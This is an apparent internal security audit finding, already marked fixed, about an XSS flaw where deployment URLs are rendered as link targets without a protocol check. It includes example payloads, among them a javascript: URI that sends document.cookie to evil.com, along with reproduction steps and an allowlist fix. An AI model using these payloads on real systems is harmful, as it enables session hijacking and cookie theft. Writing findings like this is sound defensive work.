---
id: SEC-T4-04
severity: high
category: OWASP A03 / CWE-79 — Reflected XSS via unvalidated URL in deployment link
title: deployment.url rendered as href without protocol-allowlist validation — javascript: URI possible
file: ui/src/components/deployments/IssueDeploymentLinks.tsx:118, ui/src/pages/Deployments.tsx:150
status: fixed
fixed_in: ui/src/lib/safeHref.ts (safeExternalHref); ui/src/components/deployments/IssueDeploymentLinks.tsx:118; ui/src/pages/Deployments.tsx:150; ui/src/pages/GovernedWorkflowRunDetail.tsx:114
---

## Description

The deployment `url` field — stored in the database, set by the server or agent when a deployment is created — is rendered directly as an `<a href>` attribute without any protocol validation:

```tsx
// IssueDeploymentLinks.tsx:117-125
<a
  href={deployment.url}          // ← no protocol check
  target="_blank"
  rel="noopener noreferrer"
  ...>
  Open
</a>
```

Similarly in `Deployments.tsx:148-153`:
```tsx
href={deployment.url}   // ← same pattern
```

If a malicious actor can control the `url` field of a deployment record (e.g., via a compromised agent, SSRF in the deploy pipeline, or a direct API call with a deployment-create permission), they can set it to:
- `javascript:fetch('https://evil.com/?c='+encodeURIComponent(document.cookie))//`
- `data:text/html,<script>alert(1)</script>`

A user clicking "Open" in the UI would execute arbitrary JavaScript in the same origin context.

**Contrast with `MarkdownBody.tsx`** which properly guards `href`:
```tsx
const safeHref = href && /^(https?:\/\/|\/|#|mailto:)/.test(href) ? href : undefined;
```
This pattern is absent on deployment URLs.

Note: `rel="noopener noreferrer"` only prevents the opened page from accessing `window.opener` — it does **not** prevent `javascript:` execution.

## Impact

- Stored XSS in the deployments panel for any authenticated user who views a deployment with a malicious URL.
- Cookie theft, session hijacking, CSRF using authenticated context.
- An attacker with agent permissions (or a compromised agent) can create deployments and inject URLs.

## Reproduction

1. POST to `/api/companies/:companyId/deployments` (or equivalent) with `{ "url": "javascript:alert(document.domain)" }`.
2. Navigate to the Deployments page or any issue with deployments.
3. Click the "Open" link.
4. Alert fires in the app's origin context.

## Recommendation

Apply the same sanitization used in `MarkdownBody.tsx`:

```tsx
function safeDeploymentUrl(url: string | null | undefined): string | undefined {
  if (!url) return undefined;
  return /^https?:\/\//.test(url) ? url : undefined;
}

// Usage:
<a href={safeDeploymentUrl(deployment.url)} ...>
```

Alternatively, validate at the API layer: reject any deployment URL not starting with `http://` or `https://`.

Affected files:
- `ui/src/components/deployments/IssueDeploymentLinks.tsx:118`
- `ui/src/pages/Deployments.tsx:150`
- `ui/src/pages/GovernedWorkflowRunDetail.tsx:114` (same pattern — `href={output.url}`)

## References

- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention - Attribute Contexts](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-2-attribute-encode-before-inserting-untrusted-data-into-html-common-attributes)
